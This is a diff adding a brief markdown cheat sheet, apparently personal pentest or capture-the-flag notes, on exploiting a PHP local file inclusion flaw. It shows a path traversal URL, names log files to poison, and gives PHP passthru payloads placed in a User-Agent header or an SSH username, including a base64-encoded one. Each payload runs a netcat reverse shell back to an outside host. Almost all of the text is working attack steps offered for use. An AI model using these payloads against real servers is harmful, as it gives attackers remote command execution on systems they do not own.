@@ -1,0 +1,14 @@
+#File Inclusin Vulnerability
+##Change this in the URL and intercept using burpsuite
+```<URL>?page=../../../../../proc/self/environ```
+##Add this user agent before forwarding  in burpsuit
+```<?passthru("nc -e /bin/sh 10.0.1.1 8000")?>```
+##Some places to look for infos
+```/proc/self/environ```
+```/var/log/auth/log```
+```/var/log/apache2/access.log```
+##With SSH
+```ssh "<?passthru('nc -e /bin/sh <ip> <port>');?>"@<ip>```
+##Encode as base64
+```encode from brupsuit```
+```ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjEuMSA4MDAw'));?>"@10.0.1.1```
